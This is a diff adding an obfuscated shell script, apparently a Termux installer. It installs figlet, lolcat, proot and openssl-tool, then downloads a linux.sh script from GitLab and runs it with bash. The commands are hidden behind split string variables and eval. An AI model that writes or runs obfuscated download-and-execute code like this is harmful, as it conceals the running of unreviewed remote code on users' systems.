@@ -1,0 +1,3 @@
+z="
+";nz='chmo';cz='mast';bz='raw/';Ez='et -';Dz='figl';Cz='all ';Bz='inst';Kz='t -y';Pz='wget';qz='ux.s';Jz='proo';pz=' lin';Rz='ps:/';hz='er/l';iz='.sh';Uz='com/';Yz='reso';dz='er/L';mz='et-l';oz='d +x';Fz='y';Zz='urce';fz='-Ins';sz='bash';ez='inux';Hz='lolc';Iz='at';Vz='pemb';lz='ll-g';Oz=' -y';Sz='/git';Xz='mad/';jz='rm i';Tz='lab.';rz='h';Gz='gem ';Mz='ssl-';gz='tall';Wz='riah';Az='pkg ';Lz='open';az='s/-/';Nz='tool';kz='nsta';Qz=' htt';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$Bz$Cz$Hz$Iz$z$Az$Bz$Cz$Jz$Kz$z$Az$Bz$Cz$Lz$Mz$Nz$Oz$z$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$ez$iz$z$jz$kz$lz$mz$ez$iz$z$nz$oz$pz$qz$rz$z$sz$pz$qz$rz"
